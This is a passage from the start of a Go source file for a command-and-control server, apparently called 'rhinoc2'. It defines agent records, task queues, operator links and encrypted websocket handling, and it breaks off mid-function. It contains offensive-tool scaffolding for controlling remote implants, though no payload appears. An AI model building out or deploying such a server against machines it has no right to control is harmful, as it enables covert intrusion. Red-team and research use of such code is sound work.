package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"rhinoc2/pkg/crypto"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

type Agent struct {
	ID          string
	Hostname    string
	Username    string
	OS          string
	Arch        string
	IP          string
	LastSeen    time.Time
	FirstSeen   time.Time
	Conn        *websocket.Conn
	TaskQueue   []Task
	TaskHistory []Task
	mu          sync.Mutex
	SysInfo     map[string]string
}

type Task struct {
	ID        string
	Command   string
	Args      string
	Status    string
	Result    string
	Timestamp time.Time
	Completed time.Time
}

type Message struct {
	Type    string      `json:"type"`
	AgentID string      `json:"agent_id,omitempty"`
	Data    interface{} `json:"data"`
}

type Server struct {
	agents    map[string]*Agent
	mu        sync.RWMutex
	upgrader  websocket.Upgrader
	crypto    *crypto.CryptoHandler
	operators map[*websocket.Conn]bool
	opMu      sync.RWMutex
	taskLog   []Task
	logMu     sync.RWMutex
}

func NewServer(key string) *Server {
	return &Server{
		agents: make(map[string]*Agent),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
		crypto:    crypto.NewCryptoHandler(key),
		operators: make(map[*websocket.Conn]bool),
		taskLog:   make([]Task, 0),
	}
}

func (s *Server) handleAgent(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("agent upgrade failed: %v", err)
		return
	}

	var agent *Agent
	defer func() {
